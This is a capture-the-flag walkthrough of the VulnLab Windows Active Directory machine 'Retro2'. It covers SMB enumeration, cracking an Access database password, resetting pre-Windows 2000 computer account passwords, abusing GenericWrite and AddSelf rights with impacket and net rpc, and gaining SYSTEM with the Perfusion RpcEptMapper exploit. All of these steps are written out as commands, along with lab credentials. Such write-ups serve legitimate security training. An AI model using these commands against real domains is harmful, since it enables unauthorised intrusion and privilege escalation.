**Retro2** was an easy-rated Windows Active Directory machine on VulnLab. It involved cracking the password for an encrypted **.accdb** file, changing the password for a pre-Windows 2000 computer machine, and abusing **GenericWrite** permissions to reset the password for the **ADMWS01$** machine account, which had **AddSelf** permissions on the **Services** group. We used this to add our **ldapreader** user to the **Services** group, which is a member of the **RDP** group. For privilege escalation, we used **An Unconventional Exploit for the RpcEptMapper Registry Key Vulnerability** by **itm4n**.

<img src="https://i.imgur.com/ohBWIXQ.png">

# User

## Scanning through Nmap

First, we'll use Nmap to scan the whole network and find out what services are running. With the **-p-** option, we can check all **65535** ports, and by adding **--min-rate 10000**, we can make the scan faster. After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

```shell
$ nmap -p- --min-rate 10000 10.10.119.58 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,88,135,139,445,593,636,3268,3269,3389,5722,9389,49154,49157,49158,49173
```

Now let's run a detailed scan on these specific ports using...

```bash
$ nmap -p53,88,135,139,445,593,636,3268,3269,3389,5722,9389,49154,49157,49158,49173 -sC -sV -A -T4 10.10.119.58 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-07 16:51:02Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 2012 microsoft-ds (workgroup: RETRO2)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  tcpwrapped
3269/tcp  open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=BLN01.retro2.vl
| Not valid before: 2024-08-16T11:25:28
|_Not valid after:  2025-02-15T11:25:28
5722/tcp  open  tcpwrapped
9389/tcp  open  tcpwrapped
49154/tcp open  tcpwrapped
49157/tcp open  tcpwrapped
49158/tcp open  tcpwrapped
49173/tcp open  unknown
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (98%), Linux 2.6.18 (93%), Motorola AP-51xx WAP (93%), NetworksAOK network monitoring applicance (93%), VMware ESXi 5.0 (93%), Microsoft Windows Server 2008 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Server 2008 R2 or Windows 8 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Embedded Standard 7 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
```

### Information Gathering

Through **Nmap** we found port **53 DNS** is open which can be used to perform zone transfer, **88 kerberose** is open which can be used to for enumeration and authentication purpose here, **139 & 445 SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, **3268 ldap** port is open. Nmap discover Domain name by using **ldap** scripts which is **retro2.vl** and Fully Qualified Domain Name FQDN as **BLN01.retro2.vl** . Let's add this to our local DNS file called `/etc/hosts` so that our computer can resolve domain.

```bash
$ echo "10.10.119.58 retro2.vl BLN01.retro2.vl | sudo tee -a /etc/hosts
```

### SMB Shares Enumeration using Anonymous Login

We can see that we have read permission on **Public** share.

```bash
nxc smb 10.10.119.58 -u anonymous -p '' --shares
SMB         10.10.119.58    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.119.58    445    BLN01            [+] retro2.vl\anonymous: (Guest)
SMB         10.10.119.58    445    BLN01            [*] Enumerated shares
SMB         10.10.119.58    445    BLN01            Share           Permissions     Remark
SMB         10.10.119.58    445    BLN01            -----           -----------     ------
SMB         10.10.119.58    445    BLN01            ADMIN$                          Remote Admin
SMB         10.10.119.58    445    BLN01            C$                              Default share
SMB         10.10.119.58    445    BLN01            IPC$                            Remote IPC
SMB         10.10.119.58    445    BLN01            NETLOGON                        Logon server share
SMB         10.10.119.58    445    BLN01            Public          READ       
SMB         10.10.119.58    445    BLN01            SYSVOL                          Logon server share
```

We found a file named **staff.accdb**. Let's download it to our local system using get command.

<img src="https://i.imgur.com/Hr1CVoi.png">

### What is accdb file

>**Accdb file**
>  A file with . accdb extension is **a Microsoft Access 2007 database file that stores users data in tables**. It supports storing custom forms, SQL queries, and other data. ACCDB files replaced MDB files after Microsoft shifted to XML based file structure.

We can open it in Microsoft Access App available in MS365. The **staff.accdb file** was password encrypted.

<img src="https://i.imgur.com/nVWoBQx.png">

To crack it's password we can use tool called **office2john** to convert it to hash format to make it crack able by **john** tool.

```bash
$ office2john staff.db > hash
```
<img src="https://i.imgur.com/cvtE1an.png">

### Hash cracking using John

>  John The Ripper
> **John the Ripper** is an open-source password cracking tool used for security auditing. It supports multiple hash types and uses techniques like dictionary and brute-force attacks to crack passwords. It's widely used for testing password strength across various systems.

We will be performing dictionary attack against the hash with **office format**.

```bash
$ john hash --format=office --wordlist=rockyou.txt
```

<img src="https://i.imgur.com/IyP282a.png">

John crack the password for **staff.accdb** file as **class08**.

We discover the credentials for user **ldapreader : ppYaVcB5R** from staff.accdb file

<img src="https://i.imgur.com/HSVXkg8.png">

### User Enumeration using lookupsid

Form SMB shares we have come to know that the anonymous login is allowed because we were able to see the shares without any valid credentials, we can use tool from impacket toolkit called **lookupsid** to enumerate users and their SID on domain. For this we will use command `impacket-lookupsid <domain>/anonymous@<ip> -no-pass` here -no-pass is for not asking the password, and we get a list of users and their SID on domain `retro.vl.vl`

```bash
$ lookupsid.py retro2.vl/anonymous@10.10.119.58 -no-pass | grep SidTypeUsers

Administrator
Guest
krbtgt
BLN01$
Julie.Martin
Clare.Smith
Laura.Davies
Rhys.Richards
Leah.Robinson
Michelle.Bird
Kayleigh.Stephenson
Charles.Singh
Sam.Humphreys
Margaret.Austin
Caroline.James
Lynda.Giles
Emily.Price
Lynne.Dennis
Alexandra.Black
Alex.Scott
Mandy.Davies
Marilyn.Whitehouse
Lindsey.Harrison
Sally.Davey
ADMWS01$
inventory
ldapreader
FS01$
FS02$ ​
```

We found four different machine accounts (FS01$, FS02$, ADMWS01$, BLN01$ )

### Mapping  Domain using Bloodhound-python  

We have a valid credentials on domain, we can use **bloodhound-python** to crawl the whole domain and create a zip file for mapping on bloodhound.

```bash
bloodhound-python -c All -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl --ns 10.10.119.58 --zip 
```
<img src="https://i.imgur.com/SUXaYAd.png">

On bloodhound mark **ldapreader** as owned and **ldapreader** can access the group Pre-Windows-2000-Compatible-access.

<img src="https://i.imgur.com/GK5DZm9.png">

### What is Pre-Windows 2000 Compatible Access

([Reference](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts) 1)

> **Pre-Windows 2000 Compatible Access**
> when you pre-create computer accounts with the **Assign this computer account as a pre-Windows 2000 computer** checkmark, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account _DavesLaptop$_ would have the password **daveslaptop**.

The **Assign this computer account as a pre-Windows 2000 computer** check box assigns a password that is based on the new computer name. If you do not select this check box, you are assigned a random password.

So we have four machine accounts, as discovered before. We can try and find if any of these account never used before, because password should be reset before using these account.

### Changing password of Pre-Windows 2000 Created Accounts

 **kpasswd** (binary inside krb5-user or heimdal) can be used to change the computer password, but it requires you to do some configuration and possibly edit your host file. In my lab, I installed the krb5-user using apt install and configured it by editing the `/etc/krb5.conf` file. The file for my lab looks like this:

```bash
[libdefaults]
        default_realm = RETRO2.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
[realms]
        RETRO2.VL = {
                kdc = BLN01.RETRO2.VL
                admin_server = BLN01.RETRO2.VL          }
```


Then run the following command

```bash
$ kpasswd <machine-name>

# Enter the password as machine name but in lower case like password = fs02
```

<img src="https://i.imgur.com/zjE6Bb6.png">

We can see that we successfully able to update the password of **FS02$** account.

From Bloodhound, We can see that we are a member of Domain Computer Group and Domain Computer Group have **GenericWrite** Permission on **ADMWS01** machine account and **ADMWS01** have **AddSelf** permission on **Serveries Group** and Members of **Services** group are also a member of **RDP group**. So first we reset the password of **ADMWS01** machine account by abusing the **genericWrite** permission.

<img src="https://i.imgur.com/DbTGOS1.png">

### Abusing GenericWrite Permission

We can Reset the password of **ADMWS01$** machine account by abusing the **GenericWrite Permission**. We will use tool called **addcomputer.py** from impacket toolkit. You can learn more about it on Hadess blogs [here](https://hadess.io/pwning-the-domain-dacl-abuse/#:~:text=GenericAll%2FGenericWrite%20on%20Computer,-If%20we%20have&text=since%20we%20can%20add%20a,we%20can%20perform%20RBCD%20attack.&text=attacker%20with%20this%20permission%20can,potentially%20taking%20over%20the%20machine) (Reference 2)

```bash
$ /bin/impacket-addcomputer -computer-name 'ADMWS01$' -computer-pass 'SomePassword' -no-add 'retro2.vl/FS02$:test'
```

Here:

- **--no-add** is not to create new user, just change it's password

<img src="https://i.imgur.com/PAmrRTX.png">

We can see that the password of machine account **ADMWS01$** is changed. Now, we can abuse **AddSelf** permission to add our user **ldapreader** to Services Group using net rpc command. 

```bash
$ net rpc group addmem "SERVICES" "ldapreader" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
```

Here: 

- **addmem** is to add member
- **-S** for domain controller address (Server Address)
  
<img src="https://i.imgur.com/TqEqAFq.png">

To verify if our user is successfully added in **Services** group, we can use **net rpc** command

```bash
net rpc group members "SERVICES" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl
```

Here: 
- **members** is to list down members in services group.
  
<img src="https://i.imgur.com/YQMWdFW.png">

We can see that we are now a member of **SERVICE** group. Let's get RDP session using **xfreerdp** tool.

```bash
$ xfreerdp /u:ldapreader /p:ppYaVcB5R /v:10.10.90.65 /tls-seclevel:0
```

<img src="https://i.imgur.com/EdmB8wn.png">

<img src="https://i.imgur.com/Zxx48vG.png">

User Flag is present in `C: `drive

# Privilege Escalation

From `systeminfo` command, we found useful information about the system. System is **Microsoft Windows Server 2008 R2**, I am pretty sure that there would be an public exploit will available for that.

<img src="https://i.imgur.com/yTDPIIf.png">

After some googling i discovered an interesting article by **itm4n** about **Microsoft Windows Server 2008 R2 Local Privilege Escalation**. [An Unconventional Exploit for the RpcEptMapper Registry Key Vulnerability](https://itm4n.github.io/windows-registry-rpceptmapper-exploit/) (Reference 3). The Exploit POC is also given [here](https://github.com/itm4n/Perfusion) (Reference 4).

### How does this exploit work?

Below are the exploit steps that are implemented in this tool:

1. A Process is created in the background in a suspended state (using the specified command line).
2. The embedded payload DLL is written to the current user's `Temp` folder.
3. A `Performance` key is created under `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` and is populated with the appropriate values, including the full path of the DLL that was created at step 2.
4. The WMI class `Win32_Perf` is created and invoked to trigger the collection of _Windows Performance Counters_.
5. The DLL is loaded by the WMI service either as `NT AUTHORITY\SYSTEM` or `NT AUTHORITY\LOCAL SERVICE`.
6. If the DLL is loaded by `NT AUTHORITY\SYSTEM`, its Token is duplicated and is applied to the Process that was initially created by the user at step 1.
7. Everything is cleaned up and the main Thread of the suspended Process is resumed.

After building the POC, just run the **Perfusion.exe** with flags **-c cmd -i**. We can see that we are now a `nt authority\system` on box.

<img src="https://i.imgur.com/R5gJ5aE.png">

You can get your root flag from Administrator Desktop Directory.

<img src="https://i.imgur.com/xSGLSrA.png">

# Happy Hacking ❤

# References

1. https://trustedsec.com/blog/diving-into-pre-created-computer-accounts
2. https://hadess.io/pwning-the-domain-dacl-abuse/#:~:text=GenericAll%2FGenericWrite%20on%20Computer,-If%20we%20have&text=since%20we%20can%20add%20a,we%20can%20perform%20RBCD%20attack.&text=attacker%20with%20this%20permission%20can,potentially%20taking%20over%20the%20machine
3. https://itm4n.github.io/windows-registry-rpceptmapper-exploit/
4. https://github.com/itm4n/Perfusion
